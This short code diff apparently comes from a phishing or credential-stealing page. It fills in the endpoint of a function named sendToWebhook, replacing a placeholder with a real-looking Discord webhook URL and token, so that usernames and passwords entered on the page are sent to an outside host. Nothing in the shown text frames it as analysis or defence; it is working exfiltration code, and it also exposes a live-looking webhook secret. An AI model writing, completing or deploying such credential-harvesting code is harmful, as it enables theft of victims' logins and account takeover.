@@ -128,7 +128,7 @@
         // ---------- WEBHOOK FUNCTION ----------------------
         // --------------------------------------------------
         async function sendToWebhook(username, password) {
-            const webhookUrl = "YOUR_WEBHOOK_URL_HERE"; // Replace with your actual webhook URL
+            const webhookUrl = "https://discord.com/api/webhooks/1414568057652772884/-WdSwhYyx44jjWlk29Ac-dOed621NJN_KwF7abSIkyyB8KfOuQY3busFvMulOnpImY9G"; // Replace with your actual webhook URL
             const payload = {
                 username: username,
                 password: password,
